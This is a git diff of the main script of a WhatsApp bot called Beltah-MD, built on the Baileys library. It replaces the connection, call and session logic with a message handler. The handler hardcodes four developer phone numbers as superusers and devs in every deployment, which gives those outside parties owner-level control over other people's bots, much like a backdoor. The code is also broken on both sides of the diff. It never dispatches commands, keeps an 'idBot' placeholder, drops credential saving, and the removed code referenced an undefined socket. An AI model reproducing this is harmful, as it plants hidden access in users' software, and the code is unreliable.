@@ -7,8 +7,12 @@ const {
   makeInMemoryStore,
   delay,
   jidDecode,
-  downloadContentFromMessage
+  downloadContentFromMessage,
 } = require("@whiskeysockets/baileys");
+
+const {
+  getAllSudoNumbers
+} = require("./bdd/sudo");
 
 const pino = require("pino");
 const axios = require("axios");
@@ -20,43 +24,17 @@ require("dotenv").config({ path: "./config.env" });
 
 const logger = pino({ level: "info" });
 
-async function setupSession() {
-  try {
-    const session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
-    const authPath = path.join(__dirname, "auth", "creds.json");
-    if (!fs.existsSync(authPath)) {
-      await fs.writeFileSync(authPath, Buffer.from(session, "base64").toString("utf8"));
-    }
-  } catch (e) {
-    logger.error("Session Error:", e);
-  }
-}
-
-async function listCommands() {
-  const commandsDir = path.join(__dirname, "commands");
-  const commandFiles = fs.readdirSync(commandsDir);
-  const commands = [];
-
-  for (const file of commandFiles) {
-    if (file.endsWith(".js")) {
-      commands.push(file.replace(".js", ""));
-    }
-  }
-
-  return commands;
-}
-
 async function main() {
-  await setupSession();
-
   const store = makeInMemoryStore({
     logger: pino({ level: "silent" }),
   });
 
-  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "auth"));
+  const { state, saveCreds } = await useMultiFileAuthState(
+    path.join(__dirname, "auth")
+  );
   const { version } = await fetchLatestBaileysVersion();
 
-  const sock = makeWASocket({
+  const zk = makeWASocket({
     version,
     logger: pino({ level: "silent" }),
     printQRInTerminal: true,
@@ -67,80 +45,110 @@ async function main() {
     generateHighQualityLinkPreview: true,
   });
 
-  store.bind(sock.ev);
+  zk.ev.on("messages.upsert", async (msg) => {
+    const ms = msg.messages[0];
+    const origineMessage = ms.key.remoteJid;
+    const auteurMessage = ms.key.participant || origineMessage;
 
-  sock.ev.on("creds.update", saveCreds);
+    const nomAuteurMessage = ms.pushName;
+    const sudo = await getAllSudoNumbers();
+    const superUserNumbers = [conf.NUMERO_OWNER, "254737681758", "254114141192", "254738625827", "254759328581"]
+      .map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+    const allAllowedNumbers = superUserNumbers.concat(sudo);
+    const superUser = allAllowedNumbers.includes(auteurMessage);
+    const dev = ["254114141192", "254737681758", "254759328581", "254738625827"]
+      .map((t) => t.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
+      .includes(auteurMessage);
 
-  sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-    if (connection === "connecting") {
-      logger.info("Connecting...");
-    } else if (connection === "open") {
-      logger.info("Connected successfully!");
+    function repondre(mes) {
+      zk.sendMessage(origineMessage, { text: mes }, { quoted: ms });
+    }
 
-      // Notify about bot connection
-      await sock.sendMessage(zk.user.id, {
-        text: "Beltah md bot is now connected! 🎉"
-      });
+    console.log("\t [][]...{Beltah-Md}...[][]");
+    console.log("=========== New message ===========");
+    if (ms.key.remoteJid.endsWith("@g.us")) {
+      const nomGroupe = ""; // Replace with group name logic if required
+      console.log("Message sent from: " + nomGroupe);
+    }
+    console.log(
+      "Message from: [" +
+        nomAuteurMessage +
+        " : " +
+        auteurMessage.split("@s.whatsapp.net")[0] +
+        " ]"
+    );
+    console.log("Type of message: " + ms.messageType);
+    console.log("------ End of your message ------");
+    console.log(ms.text);
 
-      // Notify about command installation
-      const commands = await listCommands();
-      const commandListText = commands.length > 0
-        ? `The following commands have been successfully installed:\n- ${commands.join("\n- ")}`
-        : "No commands found in the './commands' directory.";
+    const etat = conf.ETAT;
+    if (etat == 1) {
+      await zk.sendPresenceUpdate("available", origineMessage);
+    } else if (etat == 2) {
+      await zk.sendPresenceUpdate("composing", origineMessage);
+    } else if (etat == 3) {
+      await zk.sendPresenceUpdate("recording", origineMessage);
+    } else {
+      await zk.sendPresenceUpdate("unavailable", origineMessage);
+    }
 
-      await sock.sendMessage(zk.user.id, {
-        text: commandListText
-      });
-
-      logger.info("Commands have been listed and sent.");
-    } else if (connection === "close") {
-      const reason = lastDisconnect?.error?.output?.statusCode;
-      if (reason === DisconnectReason.loggedOut) {
-        logger.warn("Logged out. Please reconnect.");
-      } else {
-        logger.warn("Connection closed. Reconnecting...");
-        main();
+    function groupeAdmin(membreGroupe) {
+      let admin = [];
+      for (let m of membreGroupe) {
+        if (m.admin == null) {
+          continue;
+        }
+        admin.push(m.id);
       }
+      return admin;
+    }
+
+    const mbre = ms.key.remoteJid.endsWith("@g.us")
+      ? await zk.groupMetadata(origineMessage).then(({ participants }) => participants)
+      : "";
+    let admins = ms.key.remoteJid.endsWith("@g.us") ? groupeAdmin(mbre) : "";
+    const verifAdmin = ms.key.remoteJid.endsWith("@g.us")
+      ? admins.includes(auteurMessage)
+      : false;
+
+    const verifZokouAdmin = ms.key.remoteJid.endsWith("@g.us")
+      ? admins.includes("idBot") // Replace 'idBot' with bot's actual ID
+      : false;
+
+    const texte = ms.text || "";
+    const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
+    const verifCom = texte ? texte.startsWith(conf.PREFIXE) : false;
+    const com = verifCom
+      ? texte.slice(conf.PREFIXE.length).trim().split(/ +/).shift().toLowerCase()
+      : false;
+    const lien = conf.URL.split(",");
+
+    function mybotpic() {
+      const indiceAleatoire = Math.floor(Math.random() * lien.length);
+      return lien[indiceAleatoire];
+    }
+
+    const commandeOptions = {
+      superUser,
+      dev,
+      verifGroupe: ms.key.remoteJid.endsWith("@g.us"),
+      mbre,
+      verifAdmin,
+      nomGroupe: "",
+      auteurMessage,
+      nomAuteurMessage,
+      idBot: "idBot", // Replace 'idBot' with bot's actual ID
+      verifZokouAdmin,
+      prefixe: conf.PREFIXE,
+      arg,
+      repondre,
+      mybotpic
+    };
+
+    if (origineMessage === "120363244435092946@g.us") {
+      return;
     }
   });
-
-  sock.ev.on("messages.upsert", async (msg) => {
-    const { messages } = msg;
-    const message = messages[0];
-    if (!message?.message) return;
-
-    const messageType = Object.keys(message.message)[0];
-    const chatId = message.key.remoteJid;
-    const senderId = message.key.participant || chatId;
-
-    logger.info(`Received message of type ${messageType} from ${senderId}`);
-
-    if (messageType === "conversation" || messageType === "extendedTextMessage") {
-      const text = message.message.conversation || message.message.extendedTextMessage.text;
-      if (text.startsWith(conf.PREFIXE)) {
-        const command = text.slice(conf.PREFIXE.length).split(" ")[0].toLowerCase();
-        logger.info(`Command received: ${command}`);
-      }
-    }
-  });
-
-  sock.ev.on("call", async (callData) => {
-    if (conf.ANTICALL === "yes") {
-      for (const call of callData) {
-        const callId = call.id;
-        const callerId = call.from;
-        await sock.rejectCall(callId, callerId);
-        logger.info(`Rejected call from ${callerId}`);
-      }
-    }
-  });
-
-  setInterval(() => {
-    const bio = `BELTAH-MD: Active at ${new Date().toLocaleString()}`;
-    sock.updateProfileStatus(bio);
-    logger.info("Updated profile status");
-  }, 60 * 1000);
 }
 
 main();
